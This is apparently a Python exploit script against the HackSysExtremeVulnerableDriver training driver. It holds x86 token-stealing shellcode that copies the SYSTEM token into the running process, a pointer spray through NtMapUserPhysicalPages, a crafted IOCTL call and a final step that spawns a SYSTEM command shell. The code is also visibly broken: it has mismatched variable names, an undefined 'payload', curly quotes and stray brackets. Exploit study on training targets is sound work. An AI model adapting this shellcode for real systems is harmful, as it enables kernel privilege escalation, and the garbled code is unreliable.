import struct, sys, ctypes
from ctypes import *
from subprocess import *
 

kernel32 = windll.kernel32   
psapi = windll.Psapi
ntdll = windll.ntdll
 
HANDLE = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
if not handle or handle == -1:
    print “[+] Cannot get device handle….. Try again.”
    sys.exit(0)
 shellcode = bytearray(
    "\x60"                            # pushad
    "\x31\xc0"                        # xor eax,eax
    "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
    "\x8b\x40\x50"                    # mov eax,[eax+0x50]
    "\x89\xc1"                        # mov ecx,eax
    "\xba\x04\x00\x00\x00"            # mov edx,0x4
    "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    "\x75\xed"                        # jnz 0x1a
    "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
    "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
    "\x61"                            # popad
    "\x5d"                            # pop ebp
    "\xc2\x08\x00"                    # ret 0x8
)
ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(payload)),c_int(0x3000),c_int(0x40))
buf = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(ptr),buf,c_int(len(shellcode)))
ptr_adr = hex(struct.unpack('<L', struct.pack('>L', ptr))[0])[2:].zfill(8).decode('hex') * 1024
buf = “\xb0\xb0\xd0\xba”
ntdll.NtMapUserPhysicalPages(None, 1024, ptr_adr)), 

kernel32.DeviceIoControl(HANDLE, 0x22202f, buf, len(buf), None, 0, byref(c_ulong()), None)

print("[+] Spawn SYSTEM shell\n")
popen("start cmd", shell= True)
